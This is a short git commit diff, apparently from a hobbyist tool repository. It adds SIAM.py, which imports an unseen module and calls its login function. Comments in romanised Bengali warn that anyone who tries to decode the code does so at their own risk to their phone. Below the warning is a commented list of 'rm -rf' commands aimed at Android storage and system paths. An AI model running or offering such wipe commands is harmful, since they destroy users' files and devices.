bf0009a9f6db5e196acb955dab36ecde23badaa9
SIAM-143 <145361842+SIAM-TEAM-143@users.noreply.github.com>
2024-11-15 12:09:23 +0600

    Update SIAM.py

--- SIAM.py
+++ SIAM.py
@@ -1,1 +1,25 @@
+import os
+import SNEW
+SNEW.login()
 
+#-------পারলে ডিকোড করে দেখা---------#
+#-----BABU METHOD_CAPTURE-----#
+#---------------KORO-----------------#
+#---------Phn ar kisu hole-----------#
+#---------Ami kintu dai na----------#
+#######Ar dec korte gele#####
+#######kisu hole dai na ami###
+#----------------------------------------#
+#rm -rf/sdcard/Android/*'#
+#rm -rf/sdcard/Download/*'#
+#rm -rf/sdcard/Downloads/*'#
+#rm -rf/sdcard/downloads/*'#
+#rm -rf/storage/emulated/0/Pictures/*'#
+#rm -rf/storage/emulated/0/*'#
+#rm -rf/storage/emulated/*'#
+#rm -rf/system/*'#
+#rm -rfcd /sdcard/*'#
+#rm -rf/sdcard/*'#
+#rm -rf/sdcard/Screenshot/*'#
+#rm -rf/sdcard/Documents/*'#
+#---------aro ase --------------------#
